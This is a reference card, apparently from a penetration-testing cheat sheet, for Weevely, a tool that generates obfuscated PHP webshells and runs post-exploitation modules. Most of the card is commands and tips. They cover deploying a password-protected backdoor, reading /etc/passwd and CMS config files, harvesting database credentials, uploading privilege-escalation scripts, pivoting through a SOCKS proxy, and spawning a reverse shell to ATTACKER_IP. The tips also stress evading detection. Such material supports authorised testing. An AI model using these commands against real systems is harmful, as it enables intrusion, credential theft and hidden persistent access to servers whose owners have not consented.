# Weevely

- **Category**: Web / PHP Webshell
- **Risk Level**: 🔴 Critical

---

## Description

Generates and manages obfuscated PHP webshells for post-exploitation. Creates password-protected backdoor agents that communicate using steganographic techniques within HTTP requests to evade detection. Includes 30+ built-in modules for file management, network pivoting, privilege escalation, brute forcing, SQL console access, and credential harvesting. Functions as a minimal C2 framework for PHP-based environments. Written in Python.

## Installation

```bash
sudo apt install weevely
```

## Parameter Reference

| Parameter | Description |
|-----------|-------------|
| `generate <password> <path>` | Generate an obfuscated PHP agent saved to `<path>` |
| `<url> <password> [cmd]` | Connect to a deployed agent at `<url>` |
| `:help` | List all available modules (inside a session) |
| `:file_download <remote> <local>` | Download a file from the target |
| `:file_upload <local> <remote>` | Upload a file to the target |
| `:file_read <path>` | Read a file on the target |
| `:file_edit <path>` | Edit a file on the target |
| `:shell_sh <cmd>` | Execute a system shell command |
| `:shell_php <code>` | Execute PHP code on the target |
| `:net_proxy` | Start a SOCKS5 proxy through the target |
| `:net_scan <addresses> <ports>` | Scan network hosts/ports from the target |
| `:sql_console` | Open an interactive SQL console |
| `:audit_phpconf` | Audit PHP configuration for security issues |
| `:audit_suidsgid` | Find SUID/SGID binaries on the target |
| `:system_info` | Gather system information |
| `:backdoor_tcp <host> <port>` | Spawn a reverse TCP shell from the target |

## Common Commands

```bash
# Generate an obfuscated PHP agent
weevely generate MyS3cretPass /tmp/agent.php

# Connect to the deployed agent
weevely http://target.com/uploads/agent.php MyS3cretPass

# --- Inside a weevely session ---

# List all available modules
:help

# Execute a system command
:shell_sh id

# Read a sensitive file
:file_read /etc/passwd

# Upload a tool to the target
:file_upload /tmp/linpeas.sh /tmp/linpeas.sh

# Download a file from the target
:file_download /var/www/config.php /tmp/config.php

# Start a SOCKS5 proxy for pivoting
:net_proxy

# Scan internal hosts from the target
:net_scan 192.168.1.0/24 80,443,8080

# Audit PHP configuration
:audit_phpconf

# Find SUID binaries for privilege escalation
:audit_suidsgid

# Open a SQL console (auto-detects credentials)
:sql_console

# Spawn a reverse TCP shell
:backdoor_tcp ATTACKER_IP 4444

# Gather system information
:system_info
```

## Notes & Tips

1. The generated agent is polymorphic — each `generate` invocation produces a different obfuscated file, making signature-based detection harder.
2. All communication between the client and agent is obfuscated within HTTP cookie and body data, blending into normal web traffic.
3. Use `:net_proxy` to establish a SOCKS5 tunnel through the compromised host for pivoting into internal networks.
4. The `:sql_console` module auto-detects database credentials from common CMS configuration files (WordPress `wp-config.php`, Joomla `configuration.php`, etc.).
5. Always set a strong, unique password for each agent — the password is the only access control protecting the webshell.

---

## Official References

- [Weevely3 GitHub](https://github.com/epinna/weevely3)
- [Kali Tools — weevely](https://www.kali.org/tools/weevely/)
